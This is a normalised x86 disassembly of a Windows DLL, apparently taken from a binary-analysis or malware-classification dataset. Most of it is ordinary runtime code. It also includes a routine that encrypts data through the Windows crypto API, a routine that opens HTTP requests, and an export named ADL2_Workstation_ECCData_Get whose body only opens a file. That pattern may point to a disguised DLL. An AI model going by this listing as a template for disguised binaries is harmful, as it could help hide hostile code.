call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] si
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_1004985d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ ebp + 0xc ]
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10026059
mov [ esi ] ax
add esi 0x2
pop ecx
pop ecx
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
sub_1004988e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi ecx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x14 ] ebx
jbe r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn 0x10
cmp esi [ ebp + 0x10 ]
je r-xdata
lea eax [ edi + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x10 ]
sub eax esi
push eax
lea eax [ ebp + 0x8 ]
push esi
push eax
call sub_10024496
add esp 0x14
cmp eax 0xfffffffe
je r-xdata
cmp eax 0xffffffff
je r-xdata
test eax eax
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
cmp [ ebp + 0x8 ] ax
jne r-xdata
add esi eax
inc ebx
cmp ebx [ ebp + 0x14 ]
jb r-xdata
xor eax eax
push esi
call sub_10078ac0
pop ecx
inc eax
sub_10049900
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi ecx
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
not esi
lea ecx [ ebp - 0x4 ]
and esi edi
call sub_1002470e
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0xffffffff
jae r-xdata
dec eax
mov [ edi + 0x4 ] eax
sub_1004993d
push 0x5c
mov eax sub_1007f1ef
call sub_10007703
fldz
mov eax [ ebp + 0x18 ]
fld [ ebp + 0x20 ]
mov esi [ ebp + 0x8 ]
fcom st1
mov [ ebp - 0x64 ] eax
xor ebx ebx
mov [ ebp - 0x68 ] ecx
mov [ ebp - 0x60 ] bl
fnstsw ax
fstp st1
test ah 0x5
jpe r-xdata
fld [ r--data ]
mov [ ebp - 0x58 ] ebx
fcom st1
fnstsw ax
test ah 0x41
jpo r-xdata
mov [ ebp - 0x60 ] 0x1
fchs
cmp [ ebp - 0x58 ] 0x1388
jae r-xdata
fstp st0
jmp r-xdata
fxch st1
add [ ebp - 0x58 ] 0xa
fdiv [ r--data ]
fcom st1
fnstsw ax
test ah 0x1
je r-xdata
mov [ ebp - 0x40 ] 0xf
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x54 ] bl
push ecx
push ecx
fstp [ esp ]
push r--data
lea eax [ ebp - 0x38 ]
push 0x28
push eax
mov [ ebp - 0x4 ] ebx
call sub_1002868d
add esp 0x14
xor edi edi
mov [ ebp - 0x5c ] eax
cmp eax ebx
jle r-xdata
fxch st1
fstp st1
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x54 ]
call sub_10050f80
sub esp 0x1c
lea eax [ ebp - 0x54 ]
mov ecx esp
mov [ ebp - 0x5c ] esp
push eax
call sub_100408f0
push [ ebp - 0x60 ]
mov ecx [ ebp - 0x68 ]
push [ ebp + 0x1c ]
push [ ebp - 0x64 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_1006597a
push ebx
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_1001c5c0
mov eax esi
call sub_10019c00
retn 0x20
movzx eax [ ebp + edi - 0x38 ]
push eax
push 0x1
lea ecx [ ebp - 0x54 ]
call sub_10050f80
inc edi
cmp edi [ ebp - 0x5c ]
jl r-xdata
sub_10049a3d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x20 ] 0x0
push edi
mov ebx rw-data
je r-xdata
mov edi ebx
push 0x164
push 0x1
call sub_10025450
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
mov [ esi + 0xd4 ] edi
xor eax eax
add eax 0xb4
push eax
call [ InterlockedDecrement@IAT ]
mov eax esi
mov ecx edi
call sub_1007b4c4
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov [ edi + 0xb4 ] 0x1
jmp r-xdata
push edi
call sub_10058824
push edi
call sub_10020a90
pop ecx
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
sub_10049aba
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push ebx
push 0x1
push ebx
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
push edi
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0xc ]
call [ CryptImportKey@IAT ]
test eax eax
jne r-xdata
inc eax
mov eax [ ebp + 0xc ]
push [ eax ]
mov esi [ ebp + 0x8 ]
mov edi [ CryptEncrypt@IAT ]
lea eax [ ebp - 0x8 ]
push eax
push [ esi ]
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
push 0x2
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
push [ ebp - 0x4 ]
mov [ ecx ] eax
call [ CryptDestroyKey@IAT ]
xor esi esi
jmp r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
jne r-xdata
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
pop edi
mov eax esi
pop esi
jmp r-xdata
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x3
jmp r-xdata
push [ ebp - 0x8 ]
push [ esi ]
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapReAlloc@IAT ]
push [ ebp - 0x8 ]
mov [ esi ] eax
push [ ebp + 0xc ]
push eax
push ebx
push 0x1
push ebx
push [ ebp - 0x4 ]
call edi
test eax eax
jne r-xdata
pop esi
push [ ebp - 0x4 ]
call [ CryptDestroyKey@IAT ]
push 0x4
jmp r-xdata
ADL2_Workstation_ECCData_Get
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0x80000000
push r--data
call [ CreateFileW@IAT ]
push 0x0
push 0x0
push 0x0
push eax
call [ SetFilePointer@IAT ]
call [ GetLastError@IAT ]
lea eax [ eax * 4 - 0x14 ]
retn
sub_10049bd8
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_10058570
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_10059481
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_100307c3
add esp 0x1c
push eax
call sub_10005051
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_10042493
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_1000a7df
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_10049cb2
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
jbe r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn
push [ ebp + 0x14 ]
lea ecx [ ebp + 0xc ]
call sub_1006a3e7
dec [ ebp + 0x18 ]
jne r-xdata
sub_10049cdd
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1002868d
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100029f0
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_10049d3a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_10078c40
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_10049da0
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
cmp [ esi + 0xc ] 0x0
push edi
mov edi 0x1
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0xdb
call sub_1001bb80
xor eax eax
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp [ esi + 0x40 ] 0x0
je r-xdata
mov eax [ esi + 0xc ]
mov ecx [ esi + 0x398 ]
push eax
call ecx
add esp 0x4
test eax eax
jne r-xdata
call sub_10012360
test eax eax
jne r-xdata
mov [ esi + 0xc ] 0x0
xor edi edi
xor edi edi
sub_10049e30
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x10 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ edi ]
add ecx 0xc
cmp [ ebp - 0x8 ] 0x8
jb r-xdata
mov esi [ ecx + 0x10 ]
mov edx esi
cmp edx esi
jae r-xdata
mov eax [ eax ]
mov edx esi
cmp esi ebx
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ecx ]
cmp esi ebx
jb r-xdata
mov bx [ ecx ]
cmp bx [ eax ]
jne r-xdata
add edi 0x4
cmp edi [ rw-data ]
jne r-xdata
xor eax eax
cmp esi ebx
setne al
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ edi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
test eax eax
je r-xdata
sub_10049ed6
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_1003c8aa
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1000b659
sub_10049f00
push esi
mov esi ecx
mov edx 0x104
sub esi eax
lea ebx [ ebx ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor ecx ecx
mov [ eax ] cx
pop esi
retn
mov [ eax - 0x2 ] dx
pop esi
retn
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
mov [ eax - 0x2 ] dx
pop esi
retn
sub_10049f43
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
and [ esi + 0x10 ] 0x0
push [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
call sub_10013100
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10049f70
push ebp
mov ebp esp
push 0xffffffff
push sub_1007dffb
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0x8 ]
xor eax eax
cmp edx 0x5
ja r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x20 ]
or edx 0x400000
push edx
mov edx [ ebp + 0x18 ]
push edx
mov edx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
mov edx [ ebp + 0xc ]
push edx
push eax
mov eax [ ecx ]
push eax
call [ HttpOpenRequestW@IAT ]
xor ecx ecx
mov esi eax
test esi esi
setne cl
push ecx
call sub_1002f000
add esp 0x4
test esi esi
je r-xdata
jmp [ edx * 4 + jump_table_1004a034 ]
xor eax eax
push 0x8
call sub_1005ac7e
add esp 0x4
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
jmp r-xdata
mov eax r--data
push esi
mov ecx eax
call sub_100027a0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
sub_1004a04c
mov edi edi
push esi
push edi
mov esi ecx
call sub_10009537
mov edi eax
test edi edi
je r-xdata
mov esi [ esi + 0xc ]
mov eax esi
test esi esi
jne r-xdata
lea ecx [ esi + 0xc ]
push edi
call sub_1005daf0
push edi
call sub_10020a90
pop ecx
pop edi
pop esi
retn
mov eax r--data
sub_1004a080
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0x94
cmp [ esi + 0x14 ] 0x8
mov ebx eax
jb r-xdata
push edi
xor edi edi
mov edx 0x418f
sub esi ebx
mov esi [ esi ]
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
test edi edi
mov [ eax ] dx
pop edi
js r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x28 ]
cmp eax 0x13
je r-xdata
lea ecx [ edx + 0x7fffbe6f ]
test ecx ecx
je r-xdata
jmp r-xdata
mov eax 0x418f
mov ecx ebx
cmp eax 0x14
jne r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
cmp [ esi + 0x3c ] 0x0
jbe r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
js r-xdata
cmp [ ecx ] dx
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax 0x418f
mov ecx ebx
cmp [ esi + 0x84 ] 0x8
jb r-xdata
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
lea edx [ esi + 0x70 ]
mov edx [ esi + 0x70 ]
jmp r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
sub eax ecx
push r--data
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
test eax eax
je r-xdata
add ecx 0x2
dec eax
jne r-xdata
mov eax 0x418f
mov ecx ebx
mov edi edi
cmp [ esi + 0x40 ] 0x8
lea eax [ esi + 0x2c ]
jb r-xdata
mov ecx 0x418f
sub ecx eax
mov eax 0x418f
push edx
sub eax ecx
lea ecx [ ebx + ecx * 2 ]
mov edx 0x7fffffff
call sub_1006b860
test eax eax
js r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
push eax
mov esi 0x418f
call sub_10030af0
mov eax [ eax ]
sub_1004a1ef
push 0x10
push r--data
call sub_10078b50
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1003c242
and [ eax ] 0x0
call sub_10012991
mov [ eax ] 0x9
call sub_1002788e
jmp r-xdata
cmp ebx [ rw-data ]
jb r-xdata
call sub_10078b95
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_10038317
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_10012991
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_10049551
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1004a2ab
mov eax [ ebp - 0x1c ]
sub_1004a2b3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1004a342
push 0x80
mov eax sub_1007e782
call sub_10007703
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x18 ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x8c ] eax
movzx eax [ ebp + 0x1c ]
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x68 ]
push eax
mov ecx ebx
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_10018820
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x78 ] eax
call sub_1002a730
mov ecx [ ebp - 0x78 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
mov ecx [ ebp - 0x78 ]
mov eax [ ecx ]
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
and [ ebp - 0x1c ] 0x0
movzx eax ax
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x2c ] 0x0
lea eax [ edi + 0x8 ]
push eax
push 0x0
push 0x30
mov [ ebp - 0x4 ] 0x2
call sub_1005e05a
movzx eax ax
mov [ ebp - 0x70 ] eax
mov al [ esi ]
add esp 0xc
cmp al 0x2b
je r-xdata
mov [ ebp - 0x84 ] 0x1
cmp al 0x2d
je r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
and [ ebp - 0x54 ] eax
and [ ebp - 0x84 ] 0x0
jmp r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
call sub_1001bc97
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x58 ] al
mov [ ebp - 0x57 ] 0x65
call sub_100783e0
push [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
movsx eax [ ebp - 0x58 ]
push eax
push esi
call sub_100783e0
add esp 0x18
mov [ ebp - 0x60 ] eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x50 ]
add eax [ ebp - 0x54 ]
mov ecx [ ebx + 0x20 ]
add eax [ ebp - 0x74 ]
xor edx edx
add eax [ ebp - 0x5c ]
cmp [ ebx + 0x24 ] edx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] edx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x58 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx edx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_1005be50
mov eax [ ebp - 0x4c ]
test eax eax
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_100783e0
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x60 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x88 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x88 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x78 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x6c ] ecx
mov ecx [ ebp + 0x14 ]
movzx eax ax
mov [ ebp - 0x68 ] ecx
push eax
lea ecx [ ebp - 0x6c ]
call sub_1002836c
push [ ebp - 0x74 ]
mov ecx [ ebp - 0x68 ]
push [ ebp - 0x70 ]
mov eax [ ebp - 0x6c ]
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push edi
mov [ ebp + 0x14 ] ecx
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x60 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x64 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
and [ ebp - 0x4c ] 0x0
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x84 ] edx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
jne r-xdata
push 0x30
push [ ebp - 0x54 ]
lea ecx [ ebp - 0x2c ]
call sub_10050f80
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
xor esi esi
push eax
push ecx
push [ ebp - 0x8c ]
mov [ ebp + 0x14 ] eax
push edi
mov [ ebx + 0x20 ] esi
mov [ ebx + 0x24 ] esi
call sub_10017235
add esp 0x4c
push esi
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1001c5c0
push esi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_1001c5c0
mov eax [ ebp - 0x8c ]
call sub_10019c00
retn
push [ ebp - 0x80 ]
sub eax esi
inc eax
mov [ ebp - 0x68 ] eax
dec eax
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_10002dcf
mov ecx [ eax ]
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] ecx
push [ ebp - 0x70 ]
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_10017235
mov ecx [ eax ]
and [ ebp - 0x54 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ ebx + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1000a6a2
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc esi
dec [ ebp - 0x50 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebx + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
push 0x30
push [ ebp - 0x54 ]
sub eax esi
push eax
lea ecx [ ebp - 0x2c ]
call sub_10051fc9
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
call sub_10050f80
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x4c ]
mov eax [ ebp - 0x60 ]
push 0x30
lea ecx [ ebp - 0x2c ]
test eax eax
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x64 ]
push eax
push edi
call sub_1000a6a2
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x68 ]
add esp 0x18
add esi eax
sub [ ebp - 0x50 ] eax
mov ecx r--data
push [ ebp - 0x74 ]
sub eax esi
mov [ ebp - 0x60 ] eax
inc eax
push eax
call sub_10051fc9
push 0x30
push [ ebp - 0x5c ]
lea ecx [ ebp - 0x2c ]
push [ ebp - 0x60 ]
call sub_10051fc9
and [ ebp - 0x74 ] 0x0
push [ ebp - 0x5c ]
call sub_10050f80
jmp r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esi [ ebp - 0x48 ]
and [ ebp - 0x5c ] 0x0
